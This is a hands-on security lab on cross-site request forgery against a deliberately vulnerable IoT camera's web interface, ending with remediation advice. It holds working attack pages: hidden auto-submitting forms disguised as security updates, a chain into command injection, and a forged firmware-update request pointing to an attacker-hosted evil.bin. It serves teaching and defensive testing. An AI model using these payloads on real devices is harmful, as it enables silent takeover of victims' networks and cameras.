# L14: Cross-Site Request Forgery (CSRF)

## Goal
Demonstrate that the device's web interface has no CSRF protection, allowing any website visited by someone on the same network to silently trigger state-changing actions - WiFi reconfiguration, firmware updates, admin operations, and command injection - without the user's knowledge.

## Background

**Why this matters**: CSRF attacks trick a victim's browser into making unintended requests to a target web application. For IoT devices, anyone who visits a malicious web page while connected to the device's network can reconfigure the device, upload malicious firmware, or trigger admin operations - all invisibly via hidden form submissions.

**What you're looking for in IoT devices:**
- POST endpoints that accept requests without a CSRF token
- No validation of `Origin` or `Referer` HTTP headers
- No `SameSite` attribute on session cookies
- State-changing operations accessible via GET requests (triggerable by `<img src="...">` tags)

**Why this happens:**
- IoT web servers are minimal implementations without CSRF middleware
- Developers assume the device operates on an isolated network
- The Same-Origin Policy prevents JavaScript from *reading* cross-origin responses, but does NOT prevent *sending* cross-origin requests - and for state-changing endpoints, sending is all that matters

**On CoreS3**: All POST endpoints accept requests without any CSRF token, Origin header validation, or Referer checking:

| Endpoint | Method | Action | CSRF Token | Origin Check | Auth Required |
|----------|--------|--------|------------|--------------|---------------|
| `/apply` | POST | WiFi reconfiguration | None | None | No |
| `/ota` | POST | Firmware update (unsigned) | None | None | No |
| `/login` | POST | Authentication | None | None | No |
| `/api/check_pin` | POST | PIN verification | None | None | No |
| `/admin/reboot` | POST | Device reboot | None | None | Yes (JWT) |
| `/admin/selftest` | POST | Run self-test | None | None | Yes (JWT) |

The first four endpoints require no authentication, making them directly exploitable via CSRF. The `/admin/*` endpoints require a valid JWT but still lack CSRF tokens - if an attacker has already forged a JWT (L10), they can include it as a form field.

The `/apply` endpoint is also vulnerable to command injection (L08), meaning a CSRF attack can achieve remote code execution through the victim's browser.

## Hardware Setup

- CoreS3 device connected via USB (serial at `/dev/ttyACM0`)
- Computer connected to the device's WiFi AP (`CoreS3-CAM-XXXX` at `192.168.4.1`)
- Web browser on the same network
- Python 3 (to host a local HTTP server for the attack page)
- Serial terminal to observe attack effects

## Lab Walkthrough

### Step 1: Confirm No CSRF Protection Exists

Send POST requests with forged Origin and Referer headers to confirm the device does not validate request sources.

```bash
# Terminal 1: Open serial monitor to observe effects
pio device monitor -b 115200
```

```bash
# Terminal 2: Test /apply with a forged Origin header
curl -X POST http://192.168.4.1/apply \
  -H 'Origin: https://evil.example.com' \
  -H 'Referer: https://evil.example.com/attack.html' \
  -d 'ssid=test_csrf&pass=testpassword'

# Expected: Request accepted despite evil origin.
# Serial output (Terminal 1):
# [WEB] POST /apply
# [ACCESS] /apply ssid=test_csrf&pass_len=12
# Setting WiFi: SSID='test_csrf'
#
# Response: "WiFi configuration applied..."
```

```bash
# Test /ota with a forged Origin - also accepted without validation
curl -X POST http://192.168.4.1/ota \
  -H 'Origin: https://evil.example.com' \
  -d '{"url":"http://attacker.com/evil.bin"}'
```

### Step 2: Create a Basic CSRF Attack Page

Create an HTML page with a hidden form that auto-submits to `/apply` when a victim opens it. The browser follows the form's `action` attribute regardless of the page's origin - SOP only blocks reading the response, not sending the request.

```bash
# Create the attack page
mkdir -p /tmp/csrf-lab
```

Create the file `/tmp/csrf-lab/csrf_wifi.html`:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Important Security Update</title>
</head>
<body>
    <h1>Please wait while we check your system...</h1>
    <p>This page will close automatically.</p>

    <!-- Hidden form targeting the IoT camera -->
    <form id="csrf" action="http://192.168.4.1/apply" method="POST" style="display:none">
        <input type="hidden" name="ssid" value="attacker_network" />
        <input type="hidden" name="pass" value="attacker_password" />
    </form>

    <script>
        document.getElementById('csrf').submit();
    </script>
</body>
</html>
```

### Step 3: Host and Execute the CSRF Attack

Serve the attack page and open it in a browser connected to the device's WiFi. The form submits to `192.168.4.1` regardless of the page's origin.

```bash
# Terminal 2: Start a simple HTTP server to host the attack page
cd /tmp/csrf-lab
python3 -m http.server 8080

# Terminal 3: Open the attack page in a browser
xdg-open http://localhost:8080/csrf_wifi.html

# Expected behavior:
# 1. Browser opens the page showing "Please wait..."
# 2. Browser immediately submits the hidden form to 192.168.4.1
# 3. Browser navigates to the /apply response page
#
# Serial output (Terminal 1):
# [WEB] POST /apply
# [ACCESS] /apply ssid=attacker_network&pass_len=17
# Setting WiFi: SSID='attacker_network'
```

### Step 4: Chain CSRF with Command Injection (L08)

Combine CSRF with command injection in `/apply` - shell metacharacters in the SSID (`;`, `|`, `&`, backticks) cause the device to execute injected commands, delivered through the victim's browser.

Create the file `/tmp/csrf-lab/csrf_rce.html`:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Free WiFi Optimization</title>
</head>
<body>
    <h1>Optimizing your WiFi connection...</h1>
    <p>Please wait while we analyze your network.</p>

    <!-- CSRF + Command Injection: semicolon in SSID triggers command execution -->
    <form id="csrf" action="http://192.168.4.1/apply" method="POST" style="display:none">
        <input type="hidden" name="ssid" value="x;status" />
        <input type="hidden" name="pass" value="y" />
    </form>

    <script>
        document.getElementById('csrf').submit();
    </script>
</body>
</html>
```

```bash
# Host and open the chained attack page
xdg-open http://localhost:8080/csrf_rce.html

# Serial output (Terminal 1):
# [WEB] POST /apply
# [ACCESS] /apply ssid=x;status&pass_len=1
# [WIFI] potential command injection attempt detected
# [WIFI] suspicious SSID: x;status
#
# The semicolon causes the command after it to execute.
```

### Step 5: CSRF Firmware Update and Device Reboot

Target other endpoints: OTA firmware update (`/ota`) and device reboot (`/admin/reboot`).

Create `/tmp/csrf-lab/csrf_ota.html`:

```html
<!DOCTYPE html>
<html>
<body>
    <h1>Your camera has a critical security update!</h1>
    <form id="csrf" action="http://192.168.4.1/ota" method="POST" style="display:none">
        <input type="hidden" name="url" value="http://attacker.example.com/evil-firmware.bin" />
    </form>
    <script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

```bash
# Expected serial output:
# [WEB] POST /ota
# [OTA] Update requested: http://attacker.example.com/evil-firmware.bin
# [OTA] No signature verification configured - accepting arbitrary firmware.
```

Create `/tmp/csrf-lab/csrf_reboot.html`:

**Note:** `/admin/reboot` requires a valid JWT. This chains with L10 (weak JWT) - you must first forge an admin JWT and include it as a hidden form field.

```html
<!DOCTYPE html>
<html>
<body>
    <h1>Loading camera preview...</h1>
    <!-- Requires a forged admin JWT from L10 -->
    <form id="csrf" action="http://192.168.4.1/admin/reboot" method="POST" style="display:none">
        <input type="hidden" name="token" value="FORGED_ADMIN_JWT_HERE" />
    </form>
    <script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

```bash
# Expected serial output (with valid JWT):
# [WEB] POST /admin/reboot
# Rebooting...
#
# Without valid JWT:
# [WEB] POST /admin/reboot
# 401 Unauthorized
```

### Step 6: Understand Why Same-Origin Policy Does Not Help

SOP prevents JavaScript from *reading* cross-origin responses, but does NOT prevent *sending* cross-origin requests. For CSRF, sending is all that matters.

```
Attack flow:
1. Victim visits https://evil.example.com/attack.html
2. Page has: <form action="http://192.168.4.1/apply" method="POST">
3. JavaScript calls form.submit()
4. Browser sends POST to 192.168.4.1 - SOP allows sending!
5. Device processes the POST and changes WiFi settings
6. SOP blocks JS from reading the response - but the damage is done
```

## Impact

- **WiFi reconfiguration**: Any website can change the device's WiFi settings, causing denial of service or redirection to an attacker-controlled network
- **RCE via CSRF + command injection**: Chaining with `/apply` command injection (L08) achieves remote code execution through the victim's browser
- **Persistent compromise**: CSRF to `/ota` can flash unsigned malicious firmware (L07), surviving reboots
- **No user interaction required**: Auto-submitting forms execute on page load
- **Invisible attack**: Hidden form submission happens silently in the background
- **Vulnerability chaining**: CSRF is a force multiplier for every other web vulnerability (CSRF + Command Injection = RCE; CSRF + Unsigned OTA = persistent compromise)
- **Real-world parallel**: Many consumer IoT devices (routers, cameras, printers) lack CSRF protection

## Remediation

Implement at least one CSRF defense on all state-changing endpoints:

1. **Synchronizer Token Pattern**: Generate a random CSRF token per session, include as a hidden form field, validate on POST
2. **Origin Header Validation**: Reject requests where the `Origin` header does not match the device's address
3. **Custom Header Requirement**: Require `X-Requested-With` header that HTML forms cannot set

```cpp
// Example: Origin validation
String origin = webServer->header("Origin");
if (origin.length() > 0 && origin != "http://192.168.4.1") {
    webServer->send(403, "text/plain", "Cross-origin request blocked");
    return;
}
```

## References

- [CWE-352: Cross-Site Request Forgery](https://cwe.mitre.org/data/definitions/352.html)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Same-Origin Policy and CSRF](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
- [DNS Rebinding Attacks on IoT Devices](https://medium.com/@brannondorsey/attacking-private-networks-from-the-internet-with-dns-rebinding-ea7098a2d325)
- [OWASP Testing Guide - CSRF](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery)
